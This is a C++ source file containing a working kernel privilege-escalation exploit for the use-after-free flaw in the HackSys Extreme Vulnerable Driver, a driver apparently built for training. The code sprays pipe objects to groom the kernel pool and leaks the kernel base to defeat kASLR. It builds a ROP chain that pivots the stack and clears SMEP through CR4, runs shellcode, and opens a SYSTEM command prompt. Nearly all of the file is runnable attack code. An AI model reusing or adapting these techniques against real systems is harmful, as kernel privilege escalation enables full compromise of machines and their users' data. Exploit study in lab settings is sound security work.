#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <psapi.h>
#include <vector>

extern "C" void Shellcode();

#define ALLOCATE_UAF_IOCTL 0x222013
#define FREE_UAF_IOCTL 0x22201B
#define USE_UAF_IOCTL 0x222017
#define FAKE_OBJECT_IOCTL 0x22201F

#define DEFRAG_ALLOCATIONS 10000
#define CONTIGUOUS_ALLOCATIONS 30000
#define CUSTOM_ALLOCATIONS 15000

#define DRIVER_ARRAY_SIZE 1024
#define STACK_SIZE 0x14000


typedef struct PipeHandles {
    HANDLE read;
    HANDLE write;
} PipeHandles;

// taken from https://vuln.dev/windows-kernel-exploitation-hevd-x64-use-after-free/
PipeHandles CreatePipeObject() {
    DWORD ALLOC_SIZE = 0x70;
    BYTE uBuffer[0x28]; // ALLOC_SIZE - HEADER_SIZE (0x48)
    HANDLE readPipe = NULL;
    HANDLE writePipe = NULL;
    DWORD resultLength;

    RtlFillMemory(uBuffer, 0x28, 0x41);
    CreatePipe(&readPipe, &writePipe, NULL, sizeof(uBuffer));

    WriteFile(writePipe, uBuffer, sizeof(uBuffer), &resultLength, NULL);
    return PipeHandles{ readPipe, writePipe };
}

// taken from https://vuln.dev/windows-kernel-exploitation-hevd-x64-use-after-free/
void defragHeap(int allocationCount)
{
    printf("[+] Spraying objects for pool defragmentation...\n");
    std::vector<PipeHandles> defragPipeHandles;
    for (int i = 0; i < allocationCount; i++) {
        PipeHandles pipeHandle = CreatePipeObject();
        defragPipeHandles.push_back(pipeHandle);
    }
}

// taken from https://vuln.dev/windows-kernel-exploitation-hevd-x64-use-after-free/
void sprayContiguousHeap(int allocationCount)
{
    printf("[+] Spraying objects in sequential allocation...\n");
    std::vector<PipeHandles> seqPipeHandles;
    for (int i = 0; i < allocationCount; i++) {
        PipeHandles pipeHandle = CreatePipeObject();
        seqPipeHandles.push_back(pipeHandle);
    }

    printf("[+] Creating object holes...\n");
    for (int i = 0; i < seqPipeHandles.size(); i++) {
        if (i % 2 == 0) {
            PipeHandles handles = seqPipeHandles[i];
            CloseHandle(handles.read);
            CloseHandle(handles.write);
        }
    }
}

// taken from https://vuln.dev/windows-kernel-exploitation-hevd-x64-use-after-free/
void allocAndFreeUaFObject(HANDLE hDriver)
{
    DWORD bytesWritten;
    printf("[+] Allocating UAF Object...\n");
    DeviceIoControl(hDriver, ALLOCATE_UAF_IOCTL, NULL, NULL, NULL, 0, &bytesWritten, NULL);

    printf("[+] Freeing UAF Object...\n");
    DeviceIoControl(hDriver, FREE_UAF_IOCTL, NULL, NULL, NULL, 0, &bytesWritten, NULL);
}

void allocCustomObjects(HANDLE hDriver, int allocationCount, LONGLONG callback)
{
    DWORD bytesWritten;
    printf("[+] Filling holes with custom objects...\n");
    BYTE uBuffer[0x60] = { 0 };
    *(LONGLONG*)(uBuffer) = callback;
    for (int i = 0; i < allocationCount; i++) {
        DeviceIoControl(hDriver, FAKE_OBJECT_IOCTL, uBuffer, sizeof(uBuffer), NULL, 0, &bytesWritten, NULL);
    }
}

void triggerUaF(HANDLE hDriver)
{
    DWORD bytesWritten;
    printf("[+] Triggering callback on UAF object...\n");
    DeviceIoControl(hDriver, USE_UAF_IOCTL, NULL, NULL, NULL, 0, &bytesWritten, NULL);
}

LONGLONG GetKernelBase()
{
    LPVOID drivers[DRIVER_ARRAY_SIZE];
    DWORD cbNeeded;
    EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);

    return (LONGLONG)drivers[0];
}

int main(){
    printf("HEVD Use After Free Exploit\n===========================\n");

    // get a handle to the driver
    HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("[!] Unable to get a handle for the driver: %d\n", GetLastError());
        return 1;
    }

    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
        exit(1);
    }

    // get the kernel base to beat kASLR
    LONGLONG kernelBase = GetKernelBase();
    printf("[+] Kernel base: 0x%p\n", kernelBase);

    printf("[+] Shellcode address: 0x%p\n", &Shellcode);

    // stack pivoting gadgets/values
    LONGLONG STACK_PIVOT_ADDR = 0xF6000000;
    LONGLONG MOV_ESP = kernelBase + 0x28bdbb;          // mov esp, 0xF6000000; ret;

    // prepare the new stack
    LONGLONG stackAddr = STACK_PIVOT_ADDR - 0x1000;
    LPVOID stack = VirtualAlloc((LPVOID)stackAddr, STACK_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    printf("[+] User space stack, allocated address: 0x%p\n", stack);

    if (stack == 0x0)
    {
        printf("[!] Error using VirtualAlloc. Error code: %u\n %u\n", GetLastError());
        return 1;
    }

    printf("[+] VirtualLock, address: 0x%p\n", stack);
    if (!VirtualLock((LPVOID)stack, STACK_SIZE)) {
        printf("[!] Error using VirtualLock. Error code: %u\n", GetLastError());
        return 1;
    }

    LONGLONG index = 0;

    // ROP chain
    LONGLONG* rop = (LONGLONG*)((LONGLONG)STACK_PIVOT_ADDR);

    *(rop + index++) = kernelBase + 0x6390e1;                       // ret ;
    *(rop + index++) = kernelBase + 0x6390e1;                       // ret ;
    *(rop + index++) = kernelBase + 0x6390e1;                       // ret ;
    *(rop + index++) = kernelBase + 0x6390e1;                       // ret ;
    *(rop + index++) = kernelBase + 0x7f700b;                       // pop rcx
    *(rop + index++) = (LONGLONG)0x0070678;
    *(rop + index++) = kernelBase + 0x39e4a7;                       // mov cr4, rcx; ret;
    *(rop + index++) = (LONGLONG)&Shellcode;

    // round 1
    defragHeap(DEFRAG_ALLOCATIONS);
    sprayContiguousHeap(CONTIGUOUS_ALLOCATIONS);
    allocCustomObjects(hDriver, CUSTOM_ALLOCATIONS, 0x4141414141414141);

    // round 2
    allocAndFreeUaFObject(hDriver);
    allocCustomObjects(hDriver, CUSTOM_ALLOCATIONS, MOV_ESP);
    triggerUaF(hDriver);

    printf("[+] Enjoy your new shell...\n\n");
    system("cmd.exe");

    return 0;
}
